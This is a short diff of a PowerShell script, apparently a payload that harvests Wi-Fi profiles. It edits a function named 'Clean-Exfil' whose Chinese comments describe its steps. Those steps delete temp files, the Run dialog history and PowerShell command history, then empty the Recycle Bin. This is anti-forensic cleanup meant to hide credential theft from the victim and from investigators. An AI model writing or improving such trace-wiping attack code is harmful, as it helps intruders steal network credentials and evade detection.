@@ -16,13 +16,13 @@ $wifiProfiles | Out-File -FilePath $filePath
 
 function Clean-Exfil {
     # 清空临时文件夹
-    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+    Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue
 
     # 删除运行框历史记录
-    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name '*' -ErrorAction SilentlyContinue
 
     # 删除 PowerShell 历史记录
-    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
     # 清空回收站
     Clear-RecycleBin -Force -ErrorAction SilentlyContinue
